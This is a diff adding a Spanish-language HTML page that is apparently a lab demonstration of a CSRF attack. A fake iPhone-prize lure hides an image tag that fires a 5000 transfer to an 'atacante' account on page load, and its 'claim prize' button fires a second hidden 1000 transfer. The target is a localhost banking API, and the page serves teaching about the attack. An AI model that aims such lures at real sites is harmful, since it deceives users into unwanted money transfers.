@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 ¡Oferta Especial - Gana un iPhone!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .prize {
+            font-size: 3em;
+            margin: 20px 0;
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 ¡FELICIDADES! 🎉</h1>
+        <div class="prize">📱 iPhone 15 Pro</div>
+        <p>Has sido seleccionado para ganar un iPhone 15 Pro GRATIS!</p>
+        <p>Haz clic en el botón para reclamar tu premio:</p>
+        <button onclick="claimPrize()">🎁 Reclamar Premio</button>
+        <p style="margin-top: 30px; font-size: 0.9em; opacity: 0.8;">
+            * Oferta válida por tiempo limitado
+        </p>
+    </div>
+
+    <!-- ⚠️ ATAQUE CSRF: Esto se ejecuta automáticamente cuando se carga la página -->
+    <!-- El navegador intenta cargar esta "imagen" pero en realidad está haciendo una transferencia -->
+    <img src="http://localhost:5029/api/transfer?amount=5000&recipient=atacante" 
+         class="hidden"
+         onload="console.log('Transferencia realizada exitosamente')"
+         onerror="console.log('Error en transferencia (puede ser porque no estás logueado)')">
+
+    <script>
+        function claimPrize() {
+            alert('¡Gracias! Tu premio está siendo procesado...\n\n(En realidad, esta es una página de demostración de CSRF)');
+        }
+
+        // También intentamos hacer la transferencia cuando el usuario hace clic
+        // (ingeniería social adicional)
+        function claimPrize() {
+            // Hacer otra transferencia cuando hacen clic
+            var img = document.createElement('img');
+            img.src = 'http://localhost:5029/api/transfer?amount=1000&recipient=atacante2';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            
+            alert('¡Gracias! Tu premio está siendo procesado...');
+        }
+    </script>
+</body>
+</html>
+
